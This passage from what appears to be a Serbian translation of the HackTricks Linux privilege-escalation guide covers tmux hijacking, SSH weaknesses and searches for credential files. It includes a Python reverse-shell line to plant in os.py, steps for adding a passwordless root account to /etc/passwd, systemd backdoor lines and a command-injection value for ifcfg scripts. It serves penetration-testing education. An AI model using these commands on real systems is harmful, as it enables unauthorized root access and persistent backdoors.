```

## Hakovanje tmux sesija

Ovo je bio problem sa **starijim verzijama tmux-a**. Nisam mogao da hakujem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovani korisnik.

**Lista tmux sesija**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

**Povezivanje na sesiju**

Da biste se povezali na sesiju, koristite sledeću komandu:

```bash
tmux attach-session -t <ime_sesije>
```

Gde `<ime_sesije>` predstavlja ime sesije na koju želite da se povežete.

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Pogledajte **Valentine box sa HTB** za primer.

## SSH

### Debian OpenSSL Predvidljivi PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian baziranim sistemima (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag se javlja prilikom kreiranja novog ssh ključa na ovim operativnim sistemima, jer je **samo 32,768 varijacija bilo moguće**. To znači da su sve mogućnosti izračunate i **imajući javni ssh ključ možete tražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesantne konfiguracione vrednosti

* **PasswordAuthentication:** Određuje da li je dozvoljena autentifikacija lozinkom. Podrazumevana vrednost je `no`.
* **PubkeyAuthentication:** Određuje da li je dozvoljena autentifikacija putem javnog ključa. Podrazumevana vrednost je `yes`.
* **PermitEmptyPasswords**: Kada je dozvoljena autentifikacija lozinkom, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevana vrednost je `no`.

### PermitRootLogin

Određuje da li root može se prijaviti putem ssh, podrazumevana vrednost je `no`. Moguće vrednosti su:

* `yes`: root se može prijaviti koristeći lozinku i privatni ključ
* `without-password` ili `prohibit-password`: root se može prijaviti samo sa privatnim ključem
* `forced-commands-only`: Root se može prijaviti samo koristeći privatni ključ i ako su opcije komandi navedene
* `no` : ne

### AuthorizedKeysFile

Određuje datoteke koje sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati oznake poput `%h`, koje će biti zamenjene sa direktorijumom korisnika. **Možete navesti apsolutne putanje** (počinjući sa `/`) ili **relativne putanje od korisnikovog domaćeg direktorijuma**. Na primer:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracija će ukazati da ako pokušate da se prijavite sa **privatnim** ključem korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite lokalne SSH ključeve umesto da ostavljate ključeve** (bez lozinki!) na vašem serveru. Tako ćete moći da **skočite** preko ssh **na jedan** host i odatle **skočite na drugi** host **koristeći** ključ koji se nalazi na vašem **početnom hostu**.

Morate postaviti ovu opciju u `$HOME/.ssh.config` na sledeći način:

```
Host example.com
ForwardAgent yes
```

Primetite da ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći pristupiti ključevima (što predstavlja sigurnosni problem).

Fajl `/etc/ssh_config` može **zameniti** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** prosleđivanje ssh-agenta pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možete iskoristiti to da biste povećali privilegije**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interesantni fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi u `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Dakle, ako možete **pisati ili menjati bilo koji od njih, možete povećati privilegije**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ako se pronađe bilo koji čudan profilni skript, trebalo bi ga proveriti radi **osetljivih detalja**.

### Fajlovi Passwd/Shadow

Zavisno od operativnog sistema, fajlovi `/etc/passwd` i `/etc/shadow` mogu koristiti drugačije ime ili može postojati rezervna kopija. Stoga se preporučuje **pronaći sve njih** i **proveriti da li možete pročitati** fajlove da biste videli **da li se unutar njih nalaze heševi**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

U nekim situacijama možete pronaći **heš lozinki** unutar `/etc/passwd` (ili ekvivalentnog) fajla.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Writable /etc/passwd

Prvo, generišite lozinku pomoću jedne od sledećih komandi.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Na primer: `haker:$1$haker$TzyKlv0/R/c28R.GAeLw.1:0:0:Haker:/root:/bin/bash`

Sada možete koristiti `su` komandu sa `haker:haker`

Alternativno, možete koristiti sledeće linije da dodate korisnika bez lozinke.\
UPOZORENJE: možete smanjiti trenutnu sigurnost mašine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na lokaciji `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive datoteke**. Na primer, da li možete pisati u neku **konfiguracionu datoteku servisa**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti konfiguracioni fajl Tomcat servisa unutar /etc/systemd/**, tada možete izmeniti linije:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Vaša zadnja vrata će biti izvršena sledeći put kada se pokrene tomcat.

### Provera Foldera

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Čudna lokacija/Vlasnički fajlovi

Ova tehnika se fokusira na pronalaženje čudnih lokacija ili fajlova koji su u vlasništvu korisnika sa privilegijama. Ovi fajlovi mogu biti iskorišćeni za eskalaciju privilegija.

#### Pronalaženje čudnih lokacija

Prvo, treba pretražiti sistem kako bi se pronašle potencijalne čudne lokacije. Ovo se može uraditi korišćenjem komandi kao što su `find`, `locate` ili `ls`.

Na primer, možete koristiti sledeću komandu da biste pronašli sve fajlove koji su promenjeni u poslednjih 10 minuta:

```bash
find / -type f -mmin -10
```

#### Pronalaženje fajlova u vlasništvu korisnika sa privilegijama

Kada pronađete čudne lokacije, sledeći korak je da pronađete fajlove koji su u vlasništvu korisnika sa privilegijama. Ovo se može uraditi korišćenjem komande `find` i specifikovanjem korisnika sa privilegijama.

Na primer, možete koristiti sledeću komandu da biste pronašli sve fajlove koji su u vlasništvu korisnika `root`:

```bash
find / -user root
```

#### Iskorišćavanje čudnih lokacija i vlasničkih fajlova

Kada pronađete čudne lokacije ili fajlove u vlasništvu korisnika sa privilegijama, sledeći korak je da iskoristite ove fajlove za eskalaciju privilegija. Ovo može uključivati izvršavanje malicioznog koda, menjanje konfiguracionih fajlova ili iskorišćavanje ranjivosti u aplikacijama koje koriste ove fajlove.

Važno je napomenuti da je iskorišćavanje čudnih lokacija ili fajlova u vlasništvu korisnika sa privilegijama ilegalno i može imati ozbiljne pravne posledice. Ove tehnike treba primenjivati samo u okviru zakonitog testiranja penetracije ili sa odobrenjem vlasnika sistema.

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```

### Izmenjeni fajlovi u poslednjih nekoliko minuta

Ako želite da proverite koje su datoteke izmenjene u poslednjih nekoliko minuta, možete koristiti sledeću komandu:

```bash
find / -type f -mmin -5
```

Ova komanda će pretražiti ceo sistem (`/`) i pronaći sve datoteke (`-type f`) koje su izmenjene u poslednjih 5 minuta (`-mmin -5`). Možete promeniti broj minuta prema svojim potrebama.

Napomena: Ova komanda može potrajati neko vreme, posebno ako imate veliki sistem sa mnogo datoteka.

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB fajlovi

Sqlite je popularna baza podataka koja se često koristi u aplikacijama. Sqlite baza podataka se čuva u jednom fajlu, obično sa ekstenzijom `.db` ili `.sqlite`. Ovi fajlovi mogu sadržati osetljive informacije kao što su korisnička imena, lozinke, podaci o sesijama i drugi podaci koji se koriste u aplikaciji.

Kada se pristupi Sqlite DB fajlovima, moguće je izvršiti različite napade na aplikaciju. Evo nekoliko tehnika koje se mogu koristiti za napad na Sqlite DB fajlove:

* **Ekstrakcija podataka**: Sqlite DB fajlovi mogu sadržati osetljive informacije. Korišćenjem odgovarajućih alata, može se izvršiti ekstrakcija podataka iz ovih fajlova.
* **Modifikacija podataka**: Napadač može izmeniti podatke u Sqlite DB fajlovima kako bi izvršio napad na aplikaciju. Na primer, može se promeniti vrednost korisničkog naloga ili izmeniti podatke o privilegijama.
* **Injekcija SQL koda**: Sqlite DB fajlovi su podložni SQL injekcijama. Napadač može ubaciti zlonamerni SQL kod u Sqlite DB fajl kako bi izvršio napad na aplikaciju.

Da biste se zaštitili od ovih napada, važno je primeniti odgovarajuće mere bezbednosti. Ovo može uključivati enkripciju Sqlite DB fajlova, ograničavanje pristupa fajlovima samo autorizovanim korisnicima i redovno ažuriranje softvera kako bi se ispravile poznate ranjivosti.

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

### \*\_istorija, .sudo\_kao\_admin\_uspešno, profil, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

### Skriveni fajlovi

Skriveni fajlovi su fajlovi koji su namerno sakriveni od korisnika kako bi se sprečilo slučajno brisanje ili izmena. Ovi fajlovi često počinju tačkom (.) i ne prikazuju se prilikom standardnog pregleda direktorijuma. Da biste videli skrivene fajlove, možete koristiti sledeće komande:

* `ls -a` - prikazuje sve fajlove, uključujući i skrivene fajlove
* `ls -lA` - prikazuje detaljne informacije o svim fajlovima, uključujući i skrivene fajlove
* `ls -ld .*` - prikazuje samo skrivene direktorijume

Kada je u pitanju hakovanje, skriveni fajlovi mogu biti korisni jer često sadrže osetljive informacije ili konfiguracijske podatke koji mogu biti iskorišćeni za dalje napade. Stoga, prilikom analize sistema, uvek treba proveriti postojanje skrivenih fajlova.

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/Binarni fajlovi u PATH-u**

Ako imate privilegije za izvršavanje skripti ili binarnih fajlova koji se nalaze u direktorijumu koji je dodat u vaš PATH, možete iskoristiti ovu situaciju za eskalaciju privilegija. Na primer, ako postoji skripta koja se izvršava sa privilegijama root-a, a vi imate mogućnost da je izvršite, možete dobiti root privilegije.

Da biste pronašli takve skripte ili binarne fajlove, možete koristiti komandu `which` ili `whereis`. Na primer:

```bash
which skripta
whereis binarni_fajl
```

Ako pronađete skriptu ili binarni fajl koji ima privilegije koje vam omogućavaju eskalaciju privilegija, možete ih izvršiti koristeći apsolutnu putanju. Na primer:

```bash
/putanja/do/skripte
/putanja/do/binarnog_fajla
```

Ovo će vam omogućiti da izvršite skriptu ili binarni fajl sa privilegijama koje su mu dodeljene, što može rezultirati eskalacijom privilegija.

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```

### **Veb fajlovi**

Web fajlovi su fajlovi koji se koriste za hostovanje veb stranica i aplikacija. Ovi fajlovi se obično smeštaju na veb serveru i mogu biti dostupni javno ili samo određenim korisnicima. Kada se radi o hakovanju, pristup web fajlovima može biti koristan za pronalaženje slabosti u veb aplikacijama i izvršavanje napada na privilegije.

#### **Lokacija web fajlova**

Lokacija web fajlova može se razlikovati u zavisnosti od operativnog sistema i konfiguracije veb servera. Evo nekoliko uobičajenih lokacija koje treba proveriti prilikom hakovanja:

* `/var/www/html`: Ovo je često mesto gde se smeštaju veb fajlovi na Linux sistemima.
* `/var/www`: Ova lokacija se takođe koristi za smeštanje veb fajlova na nekim Linux sistemima.
* `/var/www/vhosts`: Ova lokacija se često koristi na sistemima koji koriste Apache veb server.
* `/usr/share/nginx/html`: Ovo je uobičajena lokacija za smeštanje veb fajlova na sistemima koji koriste Nginx veb server.

#### **Pronalaženje osetljivih informacija**

Prilikom pristupa web fajlovima, možete tražiti osetljive informacije koje mogu biti korisne za dalje napade. Ovo uključuje:

* Konfiguracione datoteke: Proverite da li postoje datoteke kao što su `config.php` ili `database.yml` koje mogu sadržati lozinke ili druge osetljive informacije.
* Log fajlovi: Pregledajte log fajlove kako biste pronašli informacije o greškama ili drugim osetljivim podacima.
* Backup fajlovi: Proverite da li postoje backup fajlovi koji mogu sadržati osetljive informacije.

#### **Manipulacija web fajlovima**

Kada imate pristup web fajlovima, možete ih manipulisati na različite načine kako biste izvršili napade na privilegije. Evo nekoliko tehnika koje možete koristiti:

* Izvršavanje koda: Ako imate mogućnost da izvršite kod na veb serveru, možete pokušati da izvršite zlonamerni kod kako biste preuzeli kontrolu nad sistemom.
* Menjanje konfiguracija: Ako imate pristup konfiguracionim datotekama, možete ih promeniti kako biste dobili veće privilegije ili izvršili druge napade.
* Injekcija fajlova: Pokušajte da ubacite zlonamerni kod u postojeće fajlove kako biste izvršili napade na privilegije.
* Preusmeravanje saobraćaja: Ako imate pristup konfiguraciji veb servera, možete preusmeriti saobraćaj na zlonamerni server kako biste izvršili napade na privilegije.

#### **Zaključak**

Pristup web fajlovima može biti koristan za pronalaženje slabosti u veb aplikacijama i izvršavanje napada na privilegije. Kada pristupate web fajlovima, uvek budite pažljivi i koristite ove tehnike odgovorno.

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Rezervne kopije**

Rezervne kopije su ključni deo bezbednosti sistema. Redovno pravljenje rezervnih kopija važnih podataka omogućava njihov oporavak u slučaju gubitka ili oštećenja. Evo nekoliko smernica za pravilno upravljanje rezervnim kopijama:

* Redovno pravite rezervne kopije važnih podataka.
* Proverite da li su rezervne kopije ispravne i mogu se uspešno obnoviti.
* Čuvajte rezervne kopije na sigurnom mestu, van dometa neovlašćenih lica.
* Razmotrite korišćenje enkripcije za zaštitu rezervnih kopija.
* Proverite da li su rezervne kopije dostupne u slučaju hitne situacije.

U slučaju da dođe do gubitka podataka ili oštećenja sistema, rezervne kopije mogu biti ključne za oporavak i sprečavanje gubitka informacija.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Poznati fajlovi koji sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih fajlova koji mogu sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je otvorena aplikacija koja se koristi za pronalaženje mnogo lozinki koje su sačuvane na lokalnom računaru za Windows, Linux i Mac.

### Logovi

Ako možete čitati logove, možda ćete moći pronaći **interesantne/poverljive informacije unutar njih**. Što su logovi čudniji, to će verovatno biti interesantniji.\
Takođe, neki "**loši**" konfigurisani (sa zadnjim vratima?) **audit logovi** mogu vam omogućiti da **snimite lozinke** unutar audit logova, kako je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Da biste **čitali zapise grupe** [**adm**](interesting-groups-linux-pe/#adm-group), biće vam zaista korisno.

### Shell fajlovi

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Pretraga generičkih podataka/Regex

Trebali biste takođe proveriti datoteke koje sadrže reč "**password**" u svom **nazivu** ili unutar **sadržaja**, kao i proveriti IP adrese i emailove unutar logova, ili hash regexps.\
Neću ovde navesti kako sve to uraditi, ali ako ste zainteresovani, možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) vrši.

## Datoteke sa dozvolom za pisanje

### Hakovanje Python biblioteke

Ako znate **odakle** će se izvršavati Python skripta i **možete pisati unutar** tog foldera ili možete **izmeniti Python biblioteke**, možete izmeniti OS biblioteku i postaviti tajni pristup (ako možete pisati tamo gde će se izvršavati Python skripta, kopirajte i nalepite biblioteku os.py).

Da biste **postavili tajni pristup** u biblioteku, samo dodajte na kraj biblioteke os.py sledeću liniju (promenite IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Eksploatacija Logrotate-a

Ranjivost u `logrotate`-u omogućava korisnicima sa **dozvolama za pisanje** na datoteci zapisa ili njenim nadređenim direktorijumima da potencijalno steknu privilegije sa povišenim pravima. Ovo je moguće jer `logrotate`, često pokrenut kao **root**, može biti manipulisan da izvrši proizvoljne datoteke, posebno u direktorijumima poput _**/etc/bash\_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija zapisa.

{% hint style="info" %}
Ova ranjivost utiče na verziju `logrotate`-a `3.18.0` i starije
{% endhint %}

Detaljnije informacije o ranjivosti mogu se pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx zapisi)**, pa svaki put kada otkrijete da možete menjati zapise, proverite ko upravlja tim zapisima i proverite da li možete povećati privilegije zamenom zapisa simboličkim vezama.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Reference ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može **pisati** skriptu `ifcf-<bilo šta>` u _/etc/sysconfig/network-scripts_ **ili** može **prilagoditi** postojeću, onda je vaš **sistem kompromitovan**.

Mrežne skripte, na primer _ifcg-eth0_, koriste se za mrežne veze. Izgledaju tačno kao .INI datoteke. Međutim, na Linuxu se one \~izvršavaju\~ putem Network Managera (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim mrežnim skriptama nije pravilno obrađen. Ako imate **beli/prazan prostor u imenu, sistem pokušava izvršiti deo nakon belog/praznog prostora**. Ovo znači da se **sve posle prvog praznog prostora izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

### **init, init.d, systemd i rc.d**

Direktorijum `/etc/init.d` je dom za **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje uslugama**. Uključuje skripte za `startovanje`, `zaustavljanje`, `restartovanje` i ponekad `ponovno učitavanje` usluga. Ove skripte se mogu izvršiti direktno ili putem simboličkih veza koje se nalaze u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim **sistemom za upravljanje uslugama** koji je uveden od strane Ubuntu-a, koristeći konfiguracione fajlove za zadatke upravljanja uslugama. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** se pojavljuje kao moderni inicijalizacijski i upravljački sistem, nudeći napredne funkcije kao što su pokretanje demona po potrebi, upravljanje automatskim montiranjem i snimci stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za distribucijske pakete i `/etc/systemd/system/` za administrativne modifikacije, olakšavajući proces administracije sistema.

## Ostali Trikovi

### Eskalacija privilegija putem NFS-a

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Bekstvo iz ograničenih Shell-ova

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Zaštita Kernela

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Statički impacket binarni fajlovi](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc Alati

### **Najbolji alat za pronalaženje vektora eskalacije privilegija na lokalnom Linux sistemu:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opcija)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeracija ranjivosti kernela u Linuxu i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacija više skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih \[**NFT-ova**

</details>
